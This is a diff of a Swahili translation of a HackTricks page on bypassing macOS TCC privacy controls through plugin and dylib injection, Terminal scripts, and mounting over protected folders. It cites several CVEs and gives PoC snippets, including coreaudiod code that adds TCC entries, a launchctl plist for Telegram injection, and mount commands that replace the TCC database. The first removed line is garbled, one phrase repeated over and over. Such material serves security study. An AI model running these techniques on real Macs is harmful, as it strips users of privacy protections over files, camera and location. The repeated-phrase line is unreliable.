-Kuna njia tofauti za kuingiza namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna
+Kuna njia tofauti za kuingiza msimbo ndani ya mchakato na kutumia vibali vyake vya TCC:
+
+{% content-ref url="../../../macos-proces-abuse/" %}
+[macos-proces-abuse](../../../macos-proces-abuse/)
+{% endcontent-ref %}
+
+Zaidi ya hayo, njia ya kawaida zaidi ya kuingiza mchakato kwa kufanya upitishaji wa TCC iligunduliwa kuwa ni kupitia **plugins (kupakia maktaba)**.\
+Vifaa vya ziada ni msimbo kwa kawaida katika fomu ya maktaba au plist, ambayo ita **pakuliwa na programu kuu** na kutekelezwa chini ya muktadha wake. Kwa hiyo, ikiwa programu kuu ilikuwa na ufikivu wa faili zilizozuiwa na TCC (kupitia ruhusa zilizotolewa au haki za kipekee), **msimbo wa desturi pia utakuwa nao**.
+
+### CVE-2020-27937 - Directory Utility
+
+Programu `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na ruhusa ya **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia programu za ziada na kielezo cha **`.daplug`** na **haikuwa na runtime iliyofanywa ngumu**.
+
+Ili kuifanya CVE hii kuwa silaha, **`NFSHomeDirectory`** inabadilishwa (kwa kutumia ruhusa ya awali) ili kuweza **kuchukua udhibiti wa database ya TCC ya watumiaji** ili kufanya upitishaji wa TCC.
+
+Kwa maelezo zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
 ### CVE-2020-29621 - Coreaudiod
 
-Binaryi **`/usr/sbin/coreaudiod`** ilikuwa na uwezo wa `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **kuruhusu kuingiza nambari** na ya pili ikimpa uwezo wa **kusimamia TCC**.
+Binaryi **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **kuruhusu uingizaji wa nambari** na ya pili ikimpa upatikanaji wa **kusimamia TCC**.
 
-Binary hii iliruhusu kupakia **programu-jalizi za mtu wa tatu** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, ilikuwa inawezekana **kupakia programu-jalizi na kutumia ruhusa za TCC** na hii PoC:
+Binaryi hii iliruhusu kupakia **programu-jalizi za mtu wa tatu** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hivyo, ilikuwa inawezekana **kupakia programu-jalizi na kutumia ruhusa za TCC** na hii PoC:
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -279,13 +314,13 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
-Kwa habari zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
+Kwa maelezo zaidi angalia [**ripoti ya asili**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
-### Programu za Tabaka ya Kifaa (DAL) Plug-Ins
+### Vifaa vya Tabaka la Kusawazisha (DAL) Plug-Ins
 
-Programu za mfumo ambazo hufungua mkondo wa kamera kupitia Core Media I/O (programu na **`kTCCServiceCamera`**) hulipakia **vipengele hivi** katika mchakato uliopo katika `/Library/CoreMediaIO/Plug-Ins/DAL` (hazina kizuizi cha SIP).
+Programu za mfumo ambazo hufungua mtiririko wa kamera kupitia Core Media I/O (apps na **`kTCCServiceCamera`**) hulipakia **katika mchakato huu wa programu** viendelezi hivi vilivyoko katika `/Library/CoreMediaIO/Plug-Ins/DAL` (sio kizuizi cha SIP).
 
-Kuhifadhi tu huko maktaba na **constructor** ya kawaida kutafanya kazi ya **kuingiza namna**.
+Kuhifadhi tu huko maktaba na **ujenzi wa kawaida** kutafanya kazi kwa ajili ya **kuingiza msimbo**.
 
 Programu kadhaa za Apple zilikuwa na udhaifu huu.
 
@@ -317,17 +352,17 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </dict>
 </plist>
 ```
-Kwa habari zaidi juu ya jinsi ya kuitumia [**angalia ripoti ya asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
+Kwa habari zaidi kuhusu jinsi ya kutumia hii [**angalia ripoti ya asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).
 
 ### CVE-2020-10006
 
-Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na uwezo wa **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambayo iliruhusu kuingiza nambari ndani ya mchakato na kutumia ruhusa za TCC.
+Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambayo iliruhusu kuingiza namna ndani ya mchakato na kutumia TCC privileges.
 
 ### CVE-2023-26818 - Telegram
 
-Telegram ilikuwa na uwezo wa **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo ilikuwa inawezekana kuitumia **kupata upatikanaji wa ruhusa zake** kama vile kurekodi kwa kutumia kamera. Unaweza [**kupata mzigo katika andiko**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo ilikuwa inawezekana kuitumia kwa **kupata ufikivu wa ruhusa zake** kama vile kurekodi kwa kutumia kamera. Unaweza [**kupata mzigo katika andiko**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-Tazama jinsi ya kutumia mazingira ya env kwa kupakia maktaba **plist ya desturi** iliumbwa ili kuingiza maktaba hii na **`launchctl`** iliyotumika kuizindua:
+Tafadhali angalia jinsi ya kutumia env variable kwa kupakia maktaba **plist ya desturi** ilibuniwa kuingiza maktaba hii na **`launchctl`** ilitumika kuizindua:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -357,15 +392,15 @@ Tazama jinsi ya kutumia mazingira ya env kwa kupakia maktaba **plist ya desturi*
 ```bash
 launchctl load com.telegram.launcher.plist
 ```
-## Kwa kufungua mwaliko
+## Kwa mwaliko wa wazi
 
 Inawezekana kuita **`open`** hata wakati wa kufungwa kwa mchanga
 
-### Skrini za Terminali
+### Skripti za Terminali
 
-Ni kawaida sana kutoa **Upatikanaji Kamili wa Diski (FDA)** kwa terminal, angalau kwenye kompyuta zinazotumiwa na watu wa teknolojia. Na inawezekana kuita skrini za **`.terminal`** kwa kutumia hilo.
+Ni kawaida kutoa **Upatikanaji Kamili wa Diski (FDA)** kwa terminal, angalau kwenye kompyuta zinazotumiwa na watu wa teknolojia. Na inawezekana kuita skripti za **`.terminal`** kutumia hilo.
 
-Skrini za **`.terminal`** ni faili za plist kama hii na amri ya kutekeleza kwenye ufunguo wa **`CommandString`**:
+Skripti za **`.terminal`** ni faili za plist kama hii yenye amri ya kutekelezwa kwenye ufunguo wa **`CommandString`**:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -383,7 +418,7 @@ Skrini za **`.terminal`** ni faili za plist kama hii na amri ya kutekeleza kweny
 </dict>
 </plist>
 ```
-Programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua na amri kama:
+Programu inaweza kuandika script ya terminal kwenye eneo kama /tmp na kuizindua na amri kama:
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -396,10 +431,10 @@ exploit_location]; task.standardOutput = pipe;
 ```
 ## Kwa kufunga
 
-### CVE-2020-9771 - kufunga\_apfs TCC kuvuka na kuongeza mamlaka
+### CVE-2020-9771 - kufunga\_apfs TCC kuepuka na upandishaji wa mamlaka
 
-**Mtumiaji yeyote** (hata wasio na mamlaka) anaweza kuunda na kufunga nakala ya wakati wa mashine na **kupata faili ZOTE** za nakala hiyo.\
-**Mamlaka pekee** inayohitajika ni kwa programu iliyotumiwa (kama `Terminal`) kuwa na **Upatikanaji Kamili wa Diski** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inahitaji kupewa na msimamizi. 
+**Mtumiaji yeyote** (hata wale wasio na mamlaka) wanaweza kuunda na kufunga picha ya wakati wa mashine na **kupata FAILI ZOTE** za picha hiyo.\
+**Mamlaka pekee** inayohitajika ni kwa programu iliyotumiwa (kama vile `Terminal`) kuwa na **Upatikanaji Kamili wa Diski** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inahitaji kupewa na msimamizi.
 
 {% code overflow="wrap" %}
 ```bash
@@ -423,13 +458,11 @@ ls /tmp/snap/Users/admin_user # This will work
 ```
 {% endcode %}
 
-Maelezo zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
+Maelezo zaidi yanaweza [**kupatikana kwenye ripoti ya asili**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
 
-### CVE-2021-1784 & CVE-2021-30808 - Kufunga juu ya faili ya TCC
+### CVE-2021-1784 & CVE-2021-30808 - Kufunika juu ya faili ya TCC
 
-Hata kama faili ya TCC DB imekingwa, ilikuwa inawezekana **kufunga juu ya saraka** faili mpya ya TCC.db:
-
-{% code overflow="wrap" %}
+Hata kama faili ya TCC DB ililindwa, ilikuwa inawezekana **kufunika juu ya saraka** faili mpya ya TCC.db:
 ```bash
 # CVE-2021-1784
 ## Mount over Library/Application\ Support/com.apple.TCC
@@ -454,12 +487,12 @@ Angalia **exploit kamili** katika [**maandishi ya awali**](https://theevilbit.gi
 
 ### asr
 
-Zana ya **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kuimount mahali pengine kwa kuzingilia kinga za TCC.
+Zana **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kuimount mahali pengine kwa kukiuka ulinzi wa TCC.
 
 ### Huduma za Mahali
 
-Kuna database ya tatu ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja wanaoruhusiwa **kupata huduma za mahali**.\
-Folda ya **`/var/db/locationd/` haikuwa imekingwa kutoka kwa DMG mounting** hivyo ilikuwa inawezekana kuimount plist yetu wenyewe.
+Kuna database ya tatu ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja wanaoruhusiwa kupata **huduma za mahali**.\
+Folda ya **`/var/db/locationd/` haikuwa imekingwa dhidi ya kumount DMG** hivyo ilikuwa inawezekana kumount plist yetu.
 
 ## Kupitia programu za kuanza
 
@@ -469,37 +502,23 @@ Folda ya **`/var/db/locationd/` haikuwa imekingwa kutoka kwa DMG mounting** hivy
 
 ## Kupitia grep
 
-Katika hali kadhaa, faili zitahifadhi habari nyeti kama barua pepe, namba za simu, ujumbe... katika maeneo yasiyolindwa (ambayo ni dosari katika Apple).
+Katika matukio kadhaa faili zitahifadhi taarifa nyeti kama barua pepe, namba za simu, ujumbe... katika maeneo yasiyolindwa (ambayo ni mapungufu katika Apple).
 
 <figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
 
-## Bonyeza bandia
+## Bonyeza ya Kisynthetic
 
 Hii haifanyi kazi tena, lakini [**ilifanya kazi hapo awali**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Njia nyingine kwa kutumia [**matukio ya CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):
+Njia nyingine kutumia [**matukio ya CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
-## Marejeleo
+## Marejeo
 
 * [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-* [**20+ Njia za Kudukua Mifumo ya Faragha ya macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
-* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
-
-<details>
-
-<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+* [**20+ Njia za Kukiuka Mifumo yako ya Faragha ya macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
+* [**Ushindi wa Kupigwa Dhidi ya TCC - 20+ Njia MPYA za Kukiuka Mifumo yako ya Faragha ya MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
